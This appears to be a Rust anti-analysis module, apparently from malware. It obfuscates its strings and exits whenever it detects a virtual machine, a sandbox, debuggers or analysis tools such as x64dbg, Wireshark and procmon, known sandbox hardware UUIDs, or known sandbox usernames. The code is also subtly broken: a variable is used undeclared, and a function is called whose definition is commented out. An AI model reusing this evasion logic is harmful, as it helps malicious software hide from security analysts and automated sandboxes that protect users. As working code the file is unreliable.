use std::collections::HashMap;

use wmi::{COMLibrary, Variant, WMIConnection};



pub fn detect(comlib: COMLibrary) {

        if gpu_name.is_empty() {
            gpu_name = String::from(obfstr::obfstr!("Unknown"));
        }

        if gpu_name.eq(obfstr::obfstr!("Unknown")) {
            std::process::exit(0);
        }

        if gpu_name.contains(obfstr::obfstr!("Virtual"))
            || gpu_name.contains(obfstr::obfstr!("VMware"))
            || gpu_name.contains(obfstr::obfstr!("VirtualBox"))
            || gpu_name.contains(obfstr::obfstr!("QEMU"))
        {
            if !gpu_name.contains(obfstr::obfstr!("Parsec")) {
                println!("{}", gpu_name);
                std::process::exit(0);
            }
            
        }
    
    if check_wmi(comlib) || detect_hash_processes(comlib) || rdtsc_check() {
        std::process::exit(0);
    }

}
// dang either need to increas treshold to 2500 or more; needs more testing false positive
    // fn rdtsc_check() -> bool {
    //     let mut time1: u64;
    //     let mut time2: u64;
    //     let mut sum: u64 = 0;
    //     const AVG: u64 = 100;

    //     for _ in 0..AVG {
    //         unsafe {
    //             asm!(
    //                 "rdtsc",
    //                 out("rax") time1,
    //                 out("rdx") _,
    //             );
    //         }

    //         if cfg!(target_os = "windows") {
    //             let mut _eax: u32;
    //             let _ecx: u32;
    //             let _edx: u32;
    //             unsafe {
    //                 asm!(
    //                     "cpuid",
    //                     inout("rax") 1 => _eax,
    //                     out("rcx") _ecx,
    //                     out("rdx") _edx,
    //                 );
    //             }
    //         }

    //         unsafe {
    //             asm!(
    //                 "rdtsc",
    //                 out("rax") time2,
    //                 out("rdx") _,
    //             );
    //         }

    //         sum += time2 - time1;
    //     }

    //     sum /= AVG;

    //     if sum > 1600 {
    //         return true;
    //     }

    //     false
    // }

fn detect_hash_processes(comlib: COMLibrary) -> bool {
    // Get all running processes with wmic

    let wmi_con = match WMIConnection::new(comlib) {
        Ok(wmi_con) => wmi_con,
        Err(_) => return false,
    };

    let mut processes = vec![];
    // get process name and put it in vec

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT Name FROM Win32_Process"))
        .unwrap();

    drop(wmi_con);

    for result in results {
        for value in result.values() {
            if let Variant::String(name) = value {
                processes.push(name.to_string());
            }
        }
    }

    let mut bad_names = vec![];

    bad_names.push(obfstr::obfstr!("sample").to_string());
    bad_names.push(obfstr::obfstr!("malware").to_string());
    bad_names.push(obfstr::obfstr!("virus").to_string());
    bad_names.push(obfstr::obfstr!("sandbox").to_string());
    bad_names.push(obfstr::obfstr!("maltest").to_string());
    bad_names.push(obfstr::obfstr!("test").to_string());
    bad_names.push(obfstr::obfstr!("virustest").to_string());

    let mut analysis_tools = vec![];
    analysis_tools.push(obfstr::obfstr!("ollydbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ProcessHacker.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("tcpview.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("autoruns.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("autorunsc.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("filemon.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("procmon.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("regmon.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("procexp.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("idaq.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("idaq64.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ImmunityDebugger.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("Wireshark.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("dumpcap.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("HookExplorer.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ImportREC.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("PETools.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("LordPE.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("SysInspector.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("proc_analyzer.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("sysAnalyzer.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("sniff_hit.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("windbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("joeboxcontrol.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("joeboxserver.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ResourceHacker.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("x32dbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("x64dbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("Fiddler.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("httpdebugger.exe").to_string());


    for file_name in processes {
        if file_name.len() == 64 || file_name.len() == 128 || bad_names.contains(&file_name) || analysis_tools.contains(&file_name) {
            return true;
        }
    }

    false
}

fn check_wmi(comlib: COMLibrary) -> bool {

    let wmi_con = WMIConnection::new(comlib).unwrap();


    let good_queries = vec![
        obfstr::obfstr!("SELECT * FROM Win32_PortConnector").to_string(),
        obfstr::obfstr!("SELECT * FROM CIM_Memory").to_string(),
        obfstr::obfstr!("SELECT * FROM CIM_PhysicalConnector").to_string(),
        obfstr::obfstr!("SELECT * FROM CIM_Slot").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_SMBIOSMemory").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_MemoryArray").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_MemoryDevice").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_PhysicalMemory").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_Processor").to_string(),
    ];


    for query in good_queries {
        let results: Vec<HashMap<String, Variant>> = wmi_con
            .raw_query(query.clone())
            .unwrap();

        if results.len() == 0 {
            println!("WMI query failed: {}", query.clone());
            return true;
        }
    }


   /*  let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT * FROM Win32_PortConnector"))
        .unwrap();

    if results.len() == 0 {
        return true;
    }


    let results: Vec<Hashmap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT * FROM Win32_PerfFormattedData_Counters_ThermalZoneInformation"))
        .unwrap();

    if results.len() == 0 {
        return true;
    }*/

    



    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT * FROM Win32_CacheMemory"))
        .unwrap();

    if results.len() < 2 {
        return true;
    }

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!(
            "SELECT ProductType FROM Win32_OperatingSystem"
        ))
        .unwrap();

    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                return true;
            }
        }
    }

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!(
            "SELECT UUID FROM Win32_ComputerSystemProduct"
        ))
        .unwrap();


    let mut blacklisted_hwids = vec![];

    //        blackListedHWIDS = ['08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']

    blacklisted_hwids.push(obfstr::obfstr!("7AB5C494-39F5-4941-9163-47F54D6D5016").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("03DE0294-0480-05DE-1A06-350700080009").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("03DE0294-0480-05DE-1A06-350700080009").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("11111111-2222-3333-4444-555555555555").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("6F3CA5EC-BEC9-4A4D-8274-11168F640058").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("4C4C4544-0050-3710-8058-CAC04F59344A").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("00000000-0000-0000-0000-AC1F6BD04972").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("00000000-0000-0000-0000-000000000000").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("5BD24D56-789F-8468-7CDC-CAA7222CC121").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("49434D53-0200-9065-2500-65902500E439").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("9434D53-0200-9036-2500-36902500F022").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("9434D53-0200-9036-2500-36902500F022").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("777D84B3-88D1-451C-93E4-D235177420A7").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("49434D53-0200-9036-2500-369025000C65").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("B1112042-52E8-E25B-3655-6A4F54155DBF").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("00000000-0000-0000-0000-AC1F6BD048FE").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("EB16924B-FB6D-4FA1-8666-17B91F62FB37").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("A15A930C-8251-9645-AF63-E45AD728C20C").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("C7D23342-A5D4-68A1-59AC-CF40F735B363").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("63203342-0EB0-AA1A-4DF5-3FB37DBB0670").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("44B94D56-65AB-DC02-86A0-98143A7423BF").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("6608003F-ECE4-494E-B07E-1C4615D1D93C").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("D9142042-8F51-5EFF-D5F8-EE9AE3D1602A").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("49434D53-0200-9036-2500-369025003AF0").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("8B4E8278-525C-7343-B825-280AEBCD3BCB").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("79AF5279-16CF-4094-9758-F88A616D81B4").to_string());
    blacklisted_hwids.push(obfstr::obfstr!("FF577B79-782E-0A4D-8568-B35A9B7EB76B").to_string());

    //compare to the output



    for hwid in blacklisted_hwids {
        if *results.get(0).unwrap().values().nth(0).unwrap() == Variant::String(hwid) {
            return true;
        }
    
    }
   

    let username = std::env::var(obfstr::obfstr!("USERNAME")).unwrap();

    let mut bad_names = vec![];

    bad_names.push(obfstr::obfstr!("Billy").to_string());
    bad_names.push(obfstr::obfstr!("george").to_string());
    bad_names.push(obfstr::obfstr!("Abby").to_string());
    bad_names.push(obfstr::obfstr!("Darrel Jones").to_string());
    bad_names.push(obfstr::obfstr!("John").to_string());
    bad_names.push(obfstr::obfstr!("John Zalinsky").to_string());
    bad_names.push(obfstr::obfstr!("John Doe").to_string());
    bad_names.push(obfstr::obfstr!("SHCtAGa3rm").to_string());
    bad_names.push(obfstr::obfstr!("UV0U6479boGY").to_string());
    bad_names.push(obfstr::obfstr!("8wjXNBz").to_string());
    bad_names.push(obfstr::obfstr!("WALKER").to_string());
    bad_names.push(obfstr::obfstr!("oxYT3lZggZMK").to_string());
    bad_names.push(obfstr::obfstr!("t3wObOwwaW").to_string());
    bad_names.push(obfstr::obfstr!("uh6PN").to_string());
    bad_names.push(obfstr::obfstr!("jaakw.q").to_string());
    bad_names.push(obfstr::obfstr!("sMdVVcp").to_string());
    bad_names.push(obfstr::obfstr!("06AAy3").to_string());
    bad_names.push(obfstr::obfstr!("mLfaNLLP").to_string());
    bad_names.push(obfstr::obfstr!("JPQlavKFb0Lt0").to_string());
    bad_names.push(obfstr::obfstr!("7HV8BUt5BIsCZ").to_string());
    bad_names.push(obfstr::obfstr!("aFgxGd9fq4Iv8").to_string());
    bad_names.push(obfstr::obfstr!("Frank").to_string());
    bad_names.push(obfstr::obfstr!("Anna").to_string());
    bad_names.push(obfstr::obfstr!("wdagutilityaccount").to_string());
    bad_names.push(obfstr::obfstr!("WDAGUtilityAccount").to_string());
    bad_names.push(obfstr::obfstr!("hal9th").to_string());
    bad_names.push(obfstr::obfstr!("virus").to_string());
    bad_names.push(obfstr::obfstr!("malware").to_string());
    bad_names.push(obfstr::obfstr!("sandbox").to_string());
    bad_names.push(obfstr::obfstr!("sample").to_string());
    bad_names.push(obfstr::obfstr!("currentuser").to_string());
    bad_names.push(obfstr::obfstr!("emily").to_string());
    bad_names.push(obfstr::obfstr!("hapubws").to_string());
    bad_names.push(obfstr::obfstr!("hong lee").to_string());
    bad_names.push(obfstr::obfstr!("it-admin").to_string());
    bad_names.push(obfstr::obfstr!("johnson").to_string());
    bad_names.push(obfstr::obfstr!("miller").to_string());
    bad_names.push(obfstr::obfstr!("milozs").to_string());
    bad_names.push(obfstr::obfstr!("microsoft").to_string());
    bad_names.push(obfstr::obfstr!("sand box").to_string());
    bad_names.push(obfstr::obfstr!("maltest").to_string());

    for bad_name in bad_names {
        if username == bad_name {
            return true;
        }
    }




    false
}
